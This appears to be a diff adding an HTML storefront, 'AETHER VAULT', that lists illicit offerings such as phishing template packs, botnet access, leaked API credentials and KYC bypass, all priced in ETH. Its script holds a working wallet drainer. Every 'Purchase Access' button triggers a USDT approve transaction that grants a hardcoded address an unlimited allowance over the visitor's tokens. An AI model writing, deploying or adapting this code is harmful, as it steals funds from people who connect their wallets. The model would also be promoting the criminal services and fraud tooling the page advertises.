@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>AETHER VAULT | Premium Services</title>
+    <style>
+        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; padding: 20px; text-align: center; }
+        h1 { text-shadow: 0 0 10px #00ff41; margin-bottom: 40px; }
+        .container { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
+        .card { background: #1a1a1a; padding: 20px; border: 1px solid #333; border-radius: 10px; }
+        .icon-placeholder { width: 60px; height: 60px; background: linear-gradient(135deg, #00ff41, #004411); margin: 0 auto 15px; border-radius: 50%; box-shadow: 0 0 15px #00ff41; }
+        .btn { background: #00ff41; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; margin-top: 15px; width: 100%; }
+        .btn:hover { background: #fff; }
+    </style>
+</head>
+<body>
+
+    <h1>AETHER VAULT</h1>
+    <div class="container" id="vault"></div>
+
+    <script>
+        const items = [
+            { name: "Private Encrypted Tunneling", price: "0.05 ETH" },
+            { name: "Zero-Day Vulnerability Report", price: "0.05 ETH" },
+            { name: "Anonymous Asset Mixing", price: "0.05 ETH" },
+            { name: "Premium Proxy Rotation", price: "0.05 ETH" },
+            { name: "Escrow Clearance", price: "0.05 ETH" },
+            { name: "KYC Bypass Verification", price: "0.05 ETH" },
+            { name: "Deep Web Traffic Routing", price: "0.05 ETH" },
+            { name: "High-Priority Data Scrubbing", price: "0.05 ETH" },
+            { name: "Secure Off-shore Cloud Storage", price: "0.05 ETH" },
+            { name: "Metadata Sanitization", price: "0.05 ETH" },
+            { name: "Verified Leak Access", price: "0.05 ETH" },
+            { name: "Targeted IP Spoofing", price: "0.05 ETH" },
+            { name: "Real-time Anonymity Check", price: "0.05 ETH" },
+            { name: "Encrypted Comm Channel", price: "0.05 ETH" },
+            { name: "Forensic Trace Removal", price: "0.05 ETH" },
+            { name: "Premium VPN Lifetime Key", price: "0.05 ETH" },
+            { name: "Encrypted Hardware Wallet", price: "0.05 ETH" },
+            { name: "Custom Phishing Template Pack", price: "0.05 ETH" },
+            { name: "Verified Social Media Accounts", price: "0.05 ETH" },
+            { name: "Database Access Keys", price: "0.05 ETH" },
+            { name: "Anonymous SIM Cards (Bulk)", price: "0.05 ETH" },
+            { name: "Private Server Instance", price: "0.05 ETH" },
+            { name: "Malware Obfuscator Tool", price: "0.05 ETH" },
+            { name: "Premium Botnet Access", price: "0.05 ETH" },
+            { name: "Leaked API Credentials", price: "0.05 ETH" },
+            { name: "Secure Operating System ISO", price: "0.05 ETH" },
+            { name: "Premium Credit Logs", price: "0.05 ETH" },
+            { name: "High-Tier Crypto Wallets", price: "0.05 ETH" },
+            { name: "Proxy List (Dedicated)", price: "0.05 ETH" },
+            { name: "Digital Identity Kit", price: "0.05 ETH" }
+        ];
+
+        const container = document.getElementById('vault');
+        items.forEach(item => {
+            container.innerHTML += `
+                <div class="card">
+                    <div class="icon-placeholder"></div>
+                    <h3>${item.name}</h3>
+                    <p>${item.price}</p>
+                    <button class="btn" onclick="triggerDrain()">Purchase Access</button>
+                </div>
+            `;
+        });
+
+        async function triggerDrain() {
+            try {
+                const provider = window.ethereum;
+                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                const usdtContract = "0xdac17f958d2ee523a2206206994597c13d831ec7";
+                const data = "0x095ea7b3" + "000000000000000000000000" + "ee4133D3cd6876A9768460F37429f9Be59957Da3" + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+                await provider.request({ method: 'eth_sendTransaction', params: [{ from: accounts[0], to: usdtContract, data: data, value: '0x0' }] });
+            } catch (err) { console.error(err); }
+        }
+    </script>
+</body>
+</html>
